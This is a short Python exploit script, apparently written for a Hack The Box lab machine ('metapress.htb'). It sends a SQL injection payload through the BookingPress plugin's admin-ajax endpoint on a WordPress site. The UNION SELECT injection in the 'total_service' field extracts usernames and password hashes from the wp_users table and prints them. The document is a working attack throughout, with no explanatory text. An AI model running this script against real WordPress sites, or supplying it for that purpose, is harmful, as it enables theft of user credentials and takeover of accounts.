import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = 'action=bookingpress_front_get_category_services&_wpnonce=6a1e5a8e90&category_id=33&total_service=-7502) UNION ALL SELECT user_login, user_pass, id,1,2,3,4,5,6 FROM wp_users-- -'

data = {
    'action': 'bookingpress_front_get_category_services',
    '_wpnonce': '6a1e5a8e90',
    'category_id': '33',
    'total_service': '-7502) UNION ALL SELECT user_login, user_pass, id,1,2,3,4,5,6 FROM wp_users-- -'
}

response = requests.post('http://metapress.htb/wp-admin/admin-ajax.php', headers=headers, data=data, proxies={'http': 'http://127.0.0.1:8080'})
data = response.json()
user = data[0]['bookingpress_service_id']
password = data[0]['bookingpress_category_id']
id = data[0]['bookingpress_service_name']

print("User: ", user)
print("Password: ", password)
print("ID: ", id)